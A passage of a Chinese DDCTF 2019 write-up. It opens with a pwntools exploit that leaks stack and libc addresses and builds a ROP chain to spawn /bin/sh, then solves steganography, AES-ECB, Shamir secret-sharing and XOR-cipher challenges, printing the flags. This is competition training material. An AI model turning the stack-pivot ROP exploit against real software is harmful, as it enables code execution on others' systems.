<span class="nl">.text:</span><span class="err">0804873</span><span class="nf">E</span>                 <span class="no">pop</span>     <span class="no">ebx</span>
<span class="nl">.text:</span><span class="err">0804873</span><span class="nf">F</span>                 <span class="no">pop</span>     <span class="no">ebp</span>
<span class="nl">.text:</span><span class="err">08048740</span>                 <span class="nf">lea</span>     <span class="no">esp</span><span class="p">,</span> <span class="p">[</span><span class="no">ecx-4</span><span class="p">]</span>
<span class="nl">.text:</span><span class="err">08048743</span>                 <span class="nf">retn</span>
</pre></div>
<p>留意到程序最后<code>lea     esp, [ecx-4]</code>，那么要控制<code>esp</code>就需要控制<code>ecx</code>。而<code>ecx</code>的值为<code>ebp-8</code>处的值，那么我们需要覆盖<code>ebp-8</code>为我们可控的栈空间地址。通过漏洞一，已经知道栈地址和libc基址，可以在第二次输入的开头构造ROP，然后控制<code>ecx</code>的值为ROP地址<code>+4</code>。</p>
<div class="highlight"><pre><span></span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'username: '</span><span class="p">,</span><span class="s1">'1'</span><span class="o">*</span><span class="mh">0x27</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'1'</span><span class="o">*</span><span class="mh">0x27</span><span class="o">+</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
<span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'setbuf'</span><span class="p">]</span> <span class="o">-</span> <span class="mi">21</span>
<span class="n">success</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'password: '</span><span class="p">,</span><span class="s1">'-1'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">'): '</span><span class="p">,</span><span class="n">flat</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'system'</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">'/bin/sh'</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">())</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">68</span><span class="p">,</span><span class="s1">'a'</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">stack</span><span class="o">-</span><span class="mh">0x4c</span><span class="o">+</span><span class="mi">4</span><span class="p">))</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'bye!</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="201c80e089dd3e4c9344f0df60055b53">wireshark</h3>
<p>检查http包的过程中，发现有PNG的文件头，提取图片找到一个钥匙图片，调整一下分辨率，发现底部有一个key</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134702-63f6c8de-619d-1.png"/></p>
<pre><code>key:57pmYyWt</code></pre>
<p>继续查找，还发现两个一样的美女傻笑图，不过有一张特别大。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134644-5953d7b4-619d-1.png"/></p>
<p>然后根据跟踪http的信息，可以猜测出题人使用在线加密工具（ 地址是：<a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank">http://tools.jb51.net/aideddesign/img_add_info</a> ），将flag隐藏在图片中，密码就是刚刚找到的key。</p>
<pre><code>GET /aideddesign/img_add_info HTTP/1.1
Host: tools.jb51.net
User-Agent: curl/7.54.0
Accept: */*</code></pre>
<p>使用刚才找到的较大那张美女傻笑图，用key进行解密，可以得到隐藏的信息</p>
<pre><code>图片中隐藏的信息为：flag+AHs-44444354467B5145576F6B63704865556F32574F6642494E37706F6749577346303469526A747D+AH0-</code></pre>
<p>HEX解一下得到flag</p>
<pre><code>DDCTF{QEWokcpHeUo2WOfBIN7pogIWsF04iRjt}</code></pre>
<h3 data-content="1" id="5f88f18bb7321f00dded0d2cd02cfbbe">北京地铁</h3>
<p>Color Threshold</p>
<p>提示：AES ECB密钥为小写字母</p>
<p>提示2：密钥不足位用\0补全</p>
<p>提示3：不要光记得隐写不看图片本身啊...</p>
<p><a href="https://ddctf.didichuxing.com/files/493054389fbb6a9ff9924e7adf332d33/bmp.zip" target="_blank">下载地址</a></p>
<p>RGB LSB隐写得到密文<code>iKk/Ju3vu4wOnssdIaUSrg==</code></p>
<p>秘钥需要在图片上寻找了。题目提示<code>Color threshold</code>，所以是在颜色上做文章。经观察，魏公村站颜色与同路线略有不同，所以尝试密码<code>weigongcun\x00\x00\x00\x00\x00\x00</code>，使用AES-ECB解密，成功得到flag</p>
<pre><code>from Crypto.Cipher import AES
AEScipher = AES.new('weigongcun\x00\x00\x00\x00\x00\x00',1)
print(AEScipher.decrypt('iKk/Ju3vu4wOnssdIaUSrg=='.decode('base64')))</code></pre>
<h3 data-content="1" id="1158593fc843e61506ee435b60e4b74d">联盟决策大会</h3>
<p>为了共同的利益，【组织1】和【组织2】成立了联盟，并遵守共同约定的协议。为了让协议的制定和修改更加公平，组织1和组织2共同决定：当三位以上【组织1】成员和三位以上【组织2】成员同意时，才可以制定或修改协议。为了实现这一功能，联盟的印章被锁在密码保险柜中，而保险柜的密码只通过Shamir秘密分享方案分享给【组织1】和【组织2】的每一位成员。现在，【组织1】的【成员1】、【成员2】、【成员4】，【组织2】的【成员3】、【成员4】、【成员5】一致同意制定新的协议。请还原出这套方案的设计思路，按照这套方案的思路恢复出保险柜密码，取出印章吧！</p>
<p>以下为使用到的7个十六进制常数：</p>
<pre><code>p =
C53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7
组织1成员1 =
30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A
组织1成员2 =
1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7
组织1成员4 =
1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC
组织2成员3 =
300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA
组织2成员4 =
1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9
组织2成员5 =
9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45</code></pre>
<p>应该是通过组织1的成员1，2，4 恢复出来组织1的秘钥</p>
<p>然后通过组织2的成员 3,4,5 恢复出来组织2的秘钥</p>
<p>然后将组织1和组织2的秘钥，恢复出来flag。</p>
<p>找到一篇文章可供参考</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134305-d69c8dac-619c-1.png"/></p>
<p>发挥搜索能力，然后直接找到了wiki。 直接抄<a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing#Preparation" target="_blank">wiki</a> 上的代码即可</p>
<div class="highlight"><pre><span></span><span class="c1"># The following Python implementation of Shamir's Secret Sharing is</span>
<span class="c1"># released into the Public Domain under the terms of CC0 and OWFa:</span>
<span class="c1"># https://creativecommons.org/publicdomain/zero/1.0/</span>
<span class="c1"># http://www.openwebfoundation.org/legal/the-owf-1-0-agreements/owfa-1-0</span>

<span class="c1"># See the bottom few lines for usage. Tested on Python 2 and 3.</span>


<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">division</span>
<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>

<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">functools</span>
<span class="kn">import</span> <span class="nn">libnum</span>

<span class="c1"># 12th Mersenne Prime</span>
<span class="c1"># (for this application we want a known prime number as close as</span>
<span class="c1"># possible to our security level; e.g.  desired security level of 128</span>
<span class="c1"># bits -- too large and all the ciphertext is large; too small and</span>
<span class="c1"># security is compromised)</span>

<span class="n">_PRIME</span> <span class="o">=</span> <span class="mh">0xC53094FE8C771AFC900555448D31B56CBE83CBBAE28B45971B5D504D859DBC9E00DF6B935178281B64AF7D4E32D331535F08FC6338748C8447E72763A07F8AF7</span>
<span class="c1"># 13th Mersenne Prime is 2**521 - 1</span>

<span class="n">_RINT</span> <span class="o">=</span> <span class="n">functools</span><span class="o">.</span><span class="n">partial</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">SystemRandom</span><span class="p">()</span><span class="o">.</span><span class="n">randint</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">_eval_at</span><span class="p">(</span><span class="n">poly</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">prime</span><span class="p">):</span>
    <span class="sd">'''evaluates polynomial (coefficient tuple) at x, used to generate a</span>
<span class="sd">    shamir pool in make_random_shares below.</span>
<span class="sd">    '''</span>
    <span class="n">accum</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">coeff</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">poly</span><span class="p">):</span>
        <span class="n">accum</span> <span class="o">*=</span> <span class="n">x</span>
        <span class="n">accum</span> <span class="o">+=</span> <span class="n">coeff</span>
        <span class="n">accum</span> <span class="o">%=</span> <span class="n">prime</span>
    <span class="k">return</span> <span class="n">accum</span>

<span class="k">def</span> <span class="nf">make_random_shares</span><span class="p">(</span><span class="n">minimum</span><span class="p">,</span> <span class="n">shares</span><span class="p">,</span> <span class="n">prime</span><span class="o">=</span><span class="n">_PRIME</span><span class="p">):</span>
    <span class="sd">'''</span>
<span class="sd">    Generates a random shamir pool, returns the secret and the share</span>
<span class="sd">    points.</span>
<span class="sd">    '''</span>
    <span class="k">if</span> <span class="n">minimum</span> <span class="o">&gt;</span> <span class="n">shares</span><span class="p">:</span>
        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">"pool secret would be irrecoverable"</span><span class="p">)</span>
    <span class="n">poly</span> <span class="o">=</span> <span class="p">[</span><span class="n">_RINT</span><span class="p">(</span><span class="n">prime</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">minimum</span><span class="p">)]</span>
    <span class="n">points</span> <span class="o">=</span> <span class="p">[(</span><span class="n">i</span><span class="p">,</span> <span class="n">_eval_at</span><span class="p">(</span><span class="n">poly</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">prime</span><span class="p">))</span>
              <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">shares</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)]</span>
    <span class="k">return</span> <span class="n">poly</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">points</span>

<span class="k">def</span> <span class="nf">_extended_gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="sd">'''</span>
<span class="sd">    division in integers modulus p means finding the inverse of the</span>
<span class="sd">    denominator modulo p and then multiplying the numerator by this</span>
<span class="sd">    inverse (Note: inverse of A is B such that A*B % p == 1) this can</span>
<span class="sd">    be computed via extended Euclidean algorithm</span>
<span class="sd">    http://en.wikipedia.org/wiki/Modular_multiplicative_inverse#Computation</span>
<span class="sd">    '''</span>
    <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">last_x</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">y</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="n">last_y</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="n">b</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">quot</span> <span class="o">=</span> <span class="n">a</span> <span class="o">//</span> <span class="n">b</span>
        <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">b</span><span class="p">,</span> <span class="n">a</span><span class="o">%</span><span class="n">b</span>
        <span class="n">x</span><span class="p">,</span> <span class="n">last_x</span> <span class="o">=</span> <span class="n">last_x</span> <span class="o">-</span> <span class="n">quot</span> <span class="o">*</span> <span class="n">x</span><span class="p">,</span> <span class="n">x</span>
        <span class="n">y</span><span class="p">,</span> <span class="n">last_y</span> <span class="o">=</span> <span class="n">last_y</span> <span class="o">-</span> <span class="n">quot</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span>
    <span class="k">return</span> <span class="n">last_x</span><span class="p">,</span> <span class="n">last_y</span>

<span class="k">def</span> <span class="nf">_divmod</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">den</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
    <span class="sd">'''compute num / den modulo prime p</span>

<span class="sd">    To explain what this means, the return value will be such that</span>
<span class="sd">    the following is true: den * _divmod(num, den, p) % p == num</span>
<span class="sd">    '''</span>
    <span class="n">inv</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">_extended_gcd</span><span class="p">(</span><span class="n">den</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">num</span> <span class="o">*</span> <span class="n">inv</span>

<span class="k">def</span> <span class="nf">_lagrange_interpolate</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">x_s</span><span class="p">,</span> <span class="n">y_s</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
    <span class="sd">'''</span>
<span class="sd">    Find the y-value for the given x, given n (x, y) points;</span>
<span class="sd">    k points will define a polynomial of up to kth order</span>
<span class="sd">    '''</span>
    <span class="n">k</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">x_s</span><span class="p">)</span>
    <span class="k">assert</span> <span class="n">k</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">x_s</span><span class="p">)),</span> <span class="s2">"points must be distinct"</span>
    <span class="k">def</span> <span class="nf">PI</span><span class="p">(</span><span class="n">vals</span><span class="p">):</span>  <span class="c1"># upper-case PI -- product of inputs</span>
        <span class="n">accum</span> <span class="o">=</span> <span class="mi">1</span>
        <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">vals</span><span class="p">:</span>
            <span class="n">accum</span> <span class="o">*=</span> <span class="n">v</span>
        <span class="k">return</span> <span class="n">accum</span>
    <span class="n">nums</span> <span class="o">=</span> <span class="p">[]</span>  <span class="c1"># avoid inexact division</span>
    <span class="n">dens</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
        <span class="n">others</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">x_s</span><span class="p">)</span>
        <span class="n">cur</span> <span class="o">=</span> <span class="n">others</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="n">nums</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">PI</span><span class="p">(</span><span class="n">x</span> <span class="o">-</span> <span class="n">o</span> <span class="k">for</span> <span class="n">o</span> <span class="ow">in</span> <span class="n">others</span><span class="p">))</span>
        <span class="n">dens</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">PI</span><span class="p">(</span><span class="n">cur</span> <span class="o">-</span> <span class="n">o</span> <span class="k">for</span> <span class="n">o</span> <span class="ow">in</span> <span class="n">others</span><span class="p">))</span>
    <span class="n">den</span> <span class="o">=</span> <span class="n">PI</span><span class="p">(</span><span class="n">dens</span><span class="p">)</span>
    <span class="n">num</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">([</span><span class="n">_divmod</span><span class="p">(</span><span class="n">nums</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">*</span> <span class="n">den</span> <span class="o">*</span> <span class="n">y_s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">%</span> <span class="n">p</span><span class="p">,</span> <span class="n">dens</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">p</span><span class="p">)</span>
               <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">k</span><span class="p">)])</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">_divmod</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">den</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>

<span class="k">def</span> <span class="nf">recover_secret</span><span class="p">(</span><span class="n">shares</span><span class="p">,</span> <span class="n">prime</span><span class="o">=</span><span class="n">_PRIME</span><span class="p">):</span>
    <span class="sd">'''</span>
<span class="sd">    Recover the secret from share points</span>
<span class="sd">    (x,y points on the polynomial)</span>
<span class="sd">    '''</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">shares</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">"need at least two shares"</span><span class="p">)</span>
    <span class="n">x_s</span><span class="p">,</span> <span class="n">y_s</span> <span class="o">=</span> <span class="nb">zip</span><span class="p">(</span><span class="o">*</span><span class="n">shares</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">_lagrange_interpolate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">x_s</span><span class="p">,</span> <span class="n">y_s</span><span class="p">,</span> <span class="n">prime</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="sd">'''main function'''</span>
    <span class="n">secret</span><span class="p">,</span> <span class="n">shares</span> <span class="o">=</span> <span class="n">make_random_shares</span><span class="p">(</span><span class="n">minimum</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">shares</span><span class="o">=</span><span class="mi">6</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="s1">'secret:                                                     '</span><span class="p">,</span>
          <span class="n">secret</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'shares:'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">shares</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">share</span> <span class="ow">in</span> <span class="n">shares</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s1">'  '</span><span class="p">,</span> <span class="n">share</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="s1">'secret recovered from minimum subset of shares:             '</span><span class="p">,</span>
          <span class="n">recover_secret</span><span class="p">(</span><span class="n">shares</span><span class="p">[:</span><span class="mi">3</span><span class="p">]))</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">'secret recovered from a different minimum subset of shares: '</span><span class="p">,</span>
          <span class="n">recover_secret</span><span class="p">(</span><span class="n">shares</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:]))</span>

<span class="k">def</span> <span class="nf">DDCTF</span><span class="p">():</span>
    <span class="n">shares1</span><span class="o">=</span><span class="p">[(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x30A152322E40EEE5933DE433C93827096D9EBF6F4FDADD48A18A8A8EB77B6680FE08B4176D8DCF0B6BF50000B74A8B8D572B253E63473A0916B69878A779946A</span><span class="p">),</span>
    <span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mh">0x1B309C79979CBECC08BD8AE40942AFFD17BBAFCAD3EEBA6B4DD652B5606A5B8B35B2C7959FDE49BA38F7BF3C3AC8CB4BAA6CB5C4EDACB7A9BBCCE774745A2EC7</span><span class="p">),</span>
    <span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x1E2B6A6AFA758F331F2684BB75CC898FF501C4FCDD91467138C2F55F47EB4ED347334FAD3D80DB725ABF6546BD09720D5D5F3E7BC1A401C8BD7300C253927BBC</span><span class="p">)]</span>

    <span class="n">shares2</span><span class="o">=</span><span class="p">[(</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x300991151BB6A52AEF598F944B4D43E02A45056FA39A71060C69697660B14E69265E35461D9D0BE4D8DC29E77853FB2391361BEB54A97F8D7A9D8C66AEFDF3DA</span><span class="p">),</span>
    <span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x1AAC52987C69C8A565BF9E426E759EE3455D4773B01C7164952442F13F92621F3EE2F8FE675593AE2FD6022957B0C0584199F02790AAC61D7132F7DB6A8F77B9</span><span class="p">),</span>
    <span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mh">0x9288657962CCD9647AA6B5C05937EE256108DFCD580EFA310D4348242564C9C90FBD1003FF12F6491B2E67CA8F3CC3BC157E5853E29537E8B9A55C0CF927FE45</span><span class="p">)]</span>

    <span class="n">shares3</span><span class="o">=</span><span class="p">[(</span><span class="mi">1</span><span class="p">,</span><span class="n">recover_secret</span><span class="p">(</span><span class="n">shares1</span><span class="p">)),(</span><span class="mi">2</span><span class="p">,</span><span class="n">recover_secret</span><span class="p">(</span><span class="n">shares2</span><span class="p">))]</span>

    <span class="k">print</span><span class="p">(</span><span class="n">libnum</span><span class="o">.</span><span class="n">n2s</span><span class="p">(</span><span class="n">recover_secret</span><span class="p">(</span><span class="n">shares3</span><span class="p">)))</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">DDCTF</span><span class="p">()</span>  <span class="c1"># DDCTF{5x3ROxvqF2SJrDdVy73IADA04PxdLLab}</span>
</pre></div>
<h3 data-content="1" id="a89cf275eb38ad3edaba590e33c8e474">MulTzor</h3>
<p>原文为英语，请破解</p>
<pre><code>014e084dda666a631b58d361627e5a5bcc327f651f14ef7c626a17558a71627d1251d87b656a5a47d3617f681714cf7c6a6f1651ce327f651f14dd7778791f46c4324a61165dcf612b641414fd7d79611e14fd73792d337d8a66642d0851cb762b7e0f56d9666a630e5dcb7e2b6c175bdf7c7f7e5a5bcc3246620847cf3f68621e51ce32796c1e5dc53268621759df7c626e1b40c37d657e5a5bcc327f651f14eb6a627e5a44c5656e7f0914de7a6a795a5ccb762b6f1f51c4326e63195dda7a6e7f1f508a67786414538a5765641d59cb32666c195cc37c6e7e5414fe7a627e5a4dc37767691f508a7f62611340cb60722d135ade7767611353cf7c68685a43c27b68655614cb7e64631d14dd7b7f655a40c2737f2d1c46c57f2b620e5ccf602b691f57d86b7b791f508a5373640914d8736f641514cb7c6f2d0e51c6777b7f135ade77792d0e46cb7c78601347d97b646309188a656a7e5a53c3646e635a40c2772b6e1550cf7c6a601f14ff7e7f7f1b1a8a4663640914dd73782d195bc46162691f46cf762b6f0314dd7778791f46c43258780a46cf7f6e2d3b58c67b6e695a77c57f666c1450cf602b490d5dcd7a7f2d3e1a8a57627e1f5ac27d7c680814de7d2b651b42cf3269681f5a8a306f68195dd97b7d685814de7d2b7912518a5367611351ce327d641940c5607223703efe7a6e2d3f5ac375666c5a59cb7163641451d9327c6808518a732b6b1b59c37e722d15528a62647f0e55c87e6e2d195dda7a6e7f5a59cb7163641451d9327c640e5c8a60647915468a61687f1b59c87e6e7f091a8a5564621e14c5626e7f1b40c37c6c2d0a46c5716e690f46cf61272d0a46c5626e7f164d8a77656b1546c9776f215a43c56767695a5ccb646e2d1755ce772b7912518a6267781d56c57379695a71c47b6c601b14c7736865135acf327e631846cf73606c1858cf3c2b451543cf646e7f5614c77d78795a5bcc327f651f14ed7779601b5a8a7f62611340cb60722d1c5bd8716e7e5614d977687f1f408a616e7f0c5dc977782d1b5ace3268640c5dc67b6a635a55cd77656e1351d9327f651b408a6778681e14ef7c626a17558a77667d165bd3776f2d0a5bc5602b620a51d8737f6414538a6279621951ce67796809188a7365695a5dde327c6c0914de7a6e7e1f14da7d647f5a44d87d68681e41d877782d0e5ccb662b6c1658c5656e695a40c2772b48145dcd7f6a2d1755c97a62631f478a66642d18518a606e7b1f46d97726681453c37c6e680851ce326a631e14de7a6e2d195dda7a6e7f0914de7d2b6f1f14d8776a69543ea04663685a73cf60666c1414da7e7e6a185bcb606f201f45df7b7b7d1f508a5765641d59cb3269681955c7772b431b4ec3324c680859cb7c722a0914da606263195dda73672d1946d3627f625747d3617f68171a8a5b7f2d0d55d932697f155fcf7c2b6f0314de7a6e2d2a5bc67b78655a73cf7c6e7f1b588a417f6c1c528d612b4e1344c277792d3841d8776a785a5dc4324f681951c7706e7f5a05932139215a43c366632d0e5ccf326a641e14c5742b4b0851c47163200941da6267641f508a7b65791f58c67b6c681457cf32666c0e51d87b6a615a5bc8666a641451ce326d7f15598a732b4a1f46c773652d0944d33c2b4c5a59c57c7f655a56cf74647f1f14de7a6e2d1541de7079681b5f8a7d6d2d2d5bd87e6f2d2d55d83242445614cb662b6c5a57c57c6d680851c4716e2d1251c6762b631f55d8325c6c0847cb65272d0e5ccf325b62165dd97a2b4e1344c277792d3841d8776a785a47c27379681e14c366782d3f5ac375666c5756d8776a66135acd327f68195cc47b7a781f478a7365695a40cf7163631558c575722d0d5dde7a2b7912518a5479681457c2326a631e14e86062791347c23c2b490f46c37c6c2d0e5ccf324c680859cb7c2b641442cb6162621414c5742b5d1558cb7c6f215a57c5606e2d2a5bc67b78655a77c36263680814e86779681b418a626e7f095bc47c6e615a43cf606e2d1f42cb717e6c0e51ce3e2b7b13558a4064601b5ac373272d0e5b8a54796c1457cf327c651f46cf327f651f4d8a7778791b56c67b78651f508a6663685a64e932497f0f5ac53278641d5acb7e782d135ade7767611353cf7c68685a47de737f64155a8a6562791214ec606e63195c8a746a6e1358c36662680914d9677b7d1546de3c2b5e0f57c977787e1c41c63268621544cf606a79135bc4326a60155acd327f651f14fa7d676809188a6663685a72d877656e12188a7365695a40c2772b4f085dde7b78655a55de3249611f40c97a67680314fa7379665a57c57c7f641441cf762b781440c37e2b470f5acf323a344e0486327c651f5a8a54796c1457cf3278780846cf7c6f680851ce327f625a40c2772b4a1f46c773657e543ea05479621714de7a627e5a56cf756263145dc475272d0e5ccf32497f1340c361632d3d5bdc7779631751c4662b4e1550cf326a631e14e96b7b651f468a416865155bc632234a3912e941222d1b408a5067680e57c27e6e745a64cb60602d1841c37e7f2d0f448a73652d1f4cde77657e1342cf32687f0344de73656c164dde7b682d1955da736964165dde6b252d335ac366626c1658d33e2b7912518a766e6e084dda6662621414dd73782d1755c37c67745a5bcc3247781c40dd736d6b1f1482556e7f1755c4326a640814cc7d796e1f1d8a7365695a558a746e7a5a7ccf77792d5273cf60666c1414cb6066745314c777787e1b53cf61272d1b478a6663685a7fd87b6e6a0959cb6062631f1482556e7f1755c432656c0c4d83326e600a58c56b6e695a59df71632d175bd8772b7e1f57df606e2d0a46c5716e690f46cf612b6b15468a67786414538a5765641d59cb3c2b4c1655c4325f78085dc475272d1b14e973666f085dce756e2d2f5ac3646e7f095dde6b2b601b40c277666c0e5dc97b6a635a55c4762b611553c371626c14188a6279620c5dce776f2d1741c97a2b621c14de7a6e2d1546c37562631b588a666364145fc37c6c2d0e5ccb662b611f508a66642d0e5ccf326f68095dcd7c2b621c14de7a6e2d1946d3627f6c1455c66b7f641955c63269621756cf32666c195cc37c6e7e5a40c2737f2d0d51d8772b641447de607e601f5ade73672d135a8a777d681440df7367610314c8606e6c115dc4752b7912518a7c6a7b1b588a5765641d59cb3c2b451543cf646e7f5614de7a6e2d3146c3776c7e1755d87b65685a5dc46679621e41c9776f2d1b5a8a5765641d59cb327d680847c37d652d0d5dde7a2b6c5a52c56779791214d87d7f620814cc7d792d1340d9325e20185bcb6678215a46cf617e610e5dc4752b641414cb327b7f1558c57c6c681e14da77796415508a6563681414de7a6e7e1f14c777787e1b53cf612b6e1541c6762b6315408a706e2d1e51c960727d0e51ce3c2b5a1340c2327f651f14c9737b790f46cf32646b5a46cf7e6e7b1b5ade3268640a5ccf602b661f4dd9326a631e14de7a6e2d0f47cf32646b5a59df71632d1c55d9666e7f5a61f932456c0c4d8a7064601851d93e2b7f1f53df7e6a7f5614d8737b641e14d8776a69135acd32646b5a618770646c0e14c777787e1b53cf612b7f1f47df7f6e69543ea04663685a52c6736c2d134790324f493960ec693b3a1805c8263d694b5